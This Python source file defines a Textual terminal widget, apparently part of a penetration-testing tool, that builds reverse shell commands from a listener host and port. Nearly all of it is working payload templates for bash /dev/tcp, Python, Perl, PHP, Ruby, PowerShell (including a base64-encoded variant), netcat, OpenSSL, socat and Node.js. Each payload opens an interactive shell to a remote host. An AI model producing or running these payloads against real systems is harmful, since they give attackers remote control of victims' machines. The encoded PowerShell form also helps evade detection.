"""
RevShell Generator Widget — Quick payload generation panel.
"""

from textual.widget import Widget
from textual.widgets import Static, Input, Select, Button, Label
from textual.containers import Vertical, Horizontal
from textual.message import Message


_LANGS = [
    ("bash",           "bash"),
    ("python3-pty",    "python3-pty"),
    ("python3-sub",    "python3-subprocess"),
    ("perl",           "perl"),
    ("php",            "php"),
    ("ruby",           "ruby"),
    ("powershell",     "powershell"),
    ("powershell-b64", "powershell-base64"),
    ("nc-e",           "netcat-e"),
    ("nc-mkfifo",      "netcat-mkfifo"),
    ("openssl",        "openssl"),
    ("socat",          "socat"),
    ("nodejs",         "nodejs"),
]


class RevShellGenerator(Widget):
    """Quick reverse shell payload generator panel."""

    DEFAULT_CSS = """
    RevShellGenerator {
        height: auto;
        border: solid #bc8cff;
        padding: 1;
        background: #161b22;
    }
    """

    class PayloadGenerated(Message):
        def __init__(self, payload: str, language: str, lhost: str, lport: str):
            self.payload  = payload
            self.language = language
            self.lhost    = lhost
            self.lport    = lport
            super().__init__()

    def compose(self):
        with Vertical():
            yield Static("🎯 RevShell Generator", id="revshell-title")
            with Horizontal(id="revshell-row-1"):
                yield Input(
                    placeholder="LHOST (e.g. 10.10.14.1)",
                    id="lhost-input",
                )
                yield Input(
                    placeholder="LPORT (e.g. 4444)",
                    id="lport-input",
                    value="4444",
                )
            yield Select(
                options=_LANGS,
                id="lang-select",
                prompt="Language / Method",
            )
            with Horizontal(id="revshell-row-2"):
                yield Button("⚡ Generate",         id="gen-btn",  variant="primary")
                yield Button("📋 Copy to Terminal", id="copy-btn", variant="default")

    def on_button_pressed(self, event: Button.Pressed):
        if event.button.id in ("gen-btn", "copy-btn"):
            self._generate(copy=event.button.id == "copy-btn")

    def _generate(self, copy: bool = False):
        lhost = self.query_one("#lhost-input", Input).value.strip()
        lport = self.query_one("#lport-input", Input).value.strip() or "4444"
        lang  = str(self.query_one("#lang-select", Select).value)

        if not lhost:
            return

        payload = self._build_payload(lang, lhost, lport)
        self.post_message(self.PayloadGenerated(payload, lang, lhost, lport))

    def _build_payload(self, lang: str, lhost: str, lport: str) -> str:
        templates = {
            "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            "python3-pty": (
                f"python3 -c 'import socket,subprocess,os;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                f"subprocess.call([\"/bin/bash\",\"-i\"])'"
            ),
            "python3-subprocess": (
                f"python3 -c 'import socket,os,pty;"
                f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
                f"[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
                f"pty.spawn(\"/bin/bash\")'"
            ),
            "perl": (
                f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
                f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
                f"connect(S,sockaddr_in($p,inet_aton($i)));"
                f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
                f"exec(\"/bin/bash -i\");'"
            ),
            "php": (
                f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
                f"$proc=proc_open(\"/bin/bash -i\",array(0=>$s,1=>$s,2=>$s),$pipes);'"
            ),
            "ruby": (
                f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{lhost}\",\"{lport}\");"
                f"while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'"
            ),
            "powershell": (
                f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
                f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);"
                f"$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                f"$sb3=[text.encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()}}$c.Close()\""
            ),
            "powershell-base64": (
                f"powershell -enc "
                + __import__("base64").b64encode(
                    (
                        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
                        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
                        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
                        f"$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);"
                        f"$sb=(iex $d 2>&1|Out-String)+'PS '+(pwd).Path+'> ';"
                        f"$s.Write([text.encoding]::ASCII.GetBytes($sb),0,$sb.Length);"
                        f"$s.Flush()}}$c.Close()"
                    ).encode("utf-16-le")
                ).decode()
            ),
            "netcat-e": f"nc -e /bin/bash {lhost} {lport}",
            "netcat-mkfifo": (
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1"
                f"|nc {lhost} {lport} >/tmp/f"
            ),
            "openssl": (
                f"openssl s_client -quiet -connect {lhost}:{lport}"
                f"|/bin/bash 2>&1|openssl s_client -quiet -connect {lhost}:{lport}"
            ),
            "socat": f"socat tcp:{lhost}:{lport} exec:/bin/bash,pty,stderr,setsid,sigint,sane",
            "nodejs": (
                f"node -e \"var n=require('net'),"
                f"s=new n.Socket(),c=require('child_process');"
                f"s.connect({lport},'{lhost}',function(){{var sh=c.spawn('/bin/bash',[]);"
                f"s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s);}});\""
            ),
        }
        return templates.get(lang, f"echo 'Unknown lang: {lang}'")
